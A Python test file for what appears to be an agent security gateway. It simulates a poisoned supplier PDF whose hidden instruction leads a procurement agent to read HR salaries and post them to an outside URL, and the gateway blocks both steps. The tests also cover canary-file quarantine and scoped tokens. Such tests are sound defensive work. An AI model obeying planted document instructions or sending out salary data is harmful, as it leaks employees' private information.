"""The mock enterprise, in-process behind the real gateway (the full stack, no HTTP fakes)."""

import pytest

from threatlens.core.bus import EventBus, Topics
from threatlens.core.config import Settings
from threatlens.core.schemas import DecisionType, RuntimeFingerprint
from threatlens.core.security import InvalidToken
from threatlens.detection import CachedEmbedder, Detector, HashingEmbedder
from threatlens.fusion import FusionScorer, MemoryAlertStore
from threatlens.gateway import Catalog, Gateway, ToolError
from threatlens.gateway.tokens import issue_downstream
from threatlens.identity import MemoryRegistryStore, Registry
from threatlens.intel import ImmuneScanner, IntelHub, SignatureBook
from threatlens.response import MemoryDecisionStore, ResponseOrchestrator
from threatlens.scanner import ContentForensics
from threatlens.sim import EnterpriseConnector, ExternalSink

S = Settings(env="test", jwt_signing_key="sim-test-signing-key-0123456789-abcdefgh")
GRANTS = {t: ["**"] for t in ("supplier_db.query", "files.read", "erp.create_pr", "email.send", "web.fetch", "http.post")}


class Stack:
    def __init__(self, registry, gateway, sink, bus):
        self.registry, self.gateway, self.sink, self.bus = registry, gateway, sink, bus

    def token(self, agent_id):
        return self.registry.issue_token(agent_id).token

    async def call(self, agent_id, tool, session="s1", **args):
        res = await self.gateway.tool_call(self.token(agent_id), session, tool, args,
                                           RuntimeFingerprint(host="w1", sdk="t"))
        await self.bus.drain()
        return res


@pytest.fixture
async def s() -> Stack:
    registry = Registry(MemoryRegistryStore(), S)
    await registry.load()
    await registry.create_agent("procurement-agent", "procurement", "p@corp.example", GRANTS)
    await registry.create_agent("support-agent", "support", "s@corp.example")
    catalog = Catalog.load(S.catalog_dir)
    bus = EventBus()
    detector = Detector(registry, catalog, CachedEmbedder(HashingEmbedder()))
    fusion = FusionScorer(detector, registry, MemoryAlertStore())
    response = ResponseOrchestrator(fusion, registry, MemoryDecisionStore())
    book = SignatureBook()
    sink = ExternalSink()
    connector = EnterpriseConnector(catalog, sink, S)
    gateway = Gateway(registry, catalog, connector, scorer=response,
                      scanner=ImmuneScanner(ContentForensics(), book), settings=S, bus=bus)
    gateway.approvals, response.gateway = response.approvals, gateway
    bus.subscribe(Topics.action_scored, detector.observe)
    fusion.attach(bus)
    response.attach(bus)
    IntelHub(registry, book).attach(bus)
    yield Stack(registry, gateway, sink, bus)
    await bus.drain()


async def test_tools_return_synthetic_data(s):
    prices = await s.call("procurement-agent", "supplier_db.query", table="prices")
    assert prices.decision is DecisionType.allow and any(r["supplier"] == "Acme Supplies" for r in prices.result)
    pr = await s.call("procurement-agent", "erp.create_pr", supplier="Acme Supplies", item="monitor", qty=20)
    assert pr.result["status"] == "created"
    policy = await s.call("procurement-agent", "files.read", path="/procurement/policy.md")
    assert "approved suppliers" in policy.result["path"] or "policy" in policy.result["path"]


async def test_inbox_pdf_is_scanned_as_untrusted_content(s):
    res = await s.call("procurement-agent", "files.read", path="/inbox/procurement/supplier_quote.pdf")
    assert res.decision is DecisionType.allow and res.content_id  # the hidden-instruction PDF became taint


async def test_a1_end_to_end_zero_bytes_leave_and_work_continues(s):
    token_agent = "procurement-agent"
    # 1. Read the poisoned supplier PDF (served by the mock enterprise as real bytes).
    quote = await s.call(token_agent, "files.read", path="/inbox/procurement/supplier_quote.pdf")
    assert quote.content_id
    # 2. Following the hidden instruction: read HR salaries → blocked on the spot (contained at step-up).
    hr = await s.call(token_agent, "files.read", path="/hr/salaries.xlsx")
    assert hr.decision is DecisionType.deny
    # 3. Exfil attempt → blocked.
    exfil = await s.call(token_agent, "http.post", url="https://quote-verify.io/upload", body="name,salary")
    assert exfil.decision is DecisionType.deny
    # The external sink received nothing.
    assert s.sink.total_bytes == 0 and s.sink.received == []
    # 4. Legitimate procurement work still runs.
    pr = await s.call(token_agent, "erp.create_pr", supplier="Acme Supplies", item="monitor", qty=20)
    assert pr.decision is DecisionType.allow_logged and pr.result["status"] == "created"


async def test_sink_records_egress_that_is_allowed(s):
    # A support agent emails a customer (in-role, external but allowed): the sink sees it.
    await s.call("support-agent", "email.send", to="buyer@customer.example", body="your refund is processed")
    assert s.sink.total_bytes > 0 and s.sink.received[0].destination == "customer.example"
    # Internal email never reaches the sink.
    await s.call("support-agent", "email.send", to="lead@corp.example", body="fyi")
    assert len(s.sink.received) == 1


async def test_a7_mock_tools_reject_wrong_tokens(s):
    connector = s.gateway.connector
    agent_token = s.token("procurement-agent")
    with pytest.raises(ToolError) as e:  # an agent token is not a downstream token
        await connector.call("files.read", {"path": "/procurement/policy.md"}, agent_token)
    assert e.value.status == 401

    claims = s.registry.verify(agent_token)
    good = issue_downstream(claims, "files.read", "/procurement/policy.md", "evt_x", S)
    await connector.call("files.read", {"path": "/procurement/policy.md"}, good)  # works for its exact call
    with pytest.raises(ToolError):  # but not for a different resource
        await connector.call("files.read", {"path": "/hr/salaries.xlsx"}, good)


async def test_canary_file_is_served_but_access_is_isolated(s):
    res = await s.call("procurement-agent", "files.read", path="/hr/salaries_2026_FINAL.xlsx")
    assert res.decision is DecisionType.quarantine  # isolated before the tool ran
    assert s.registry.agent("procurement-agent").status.value == "quarantined"
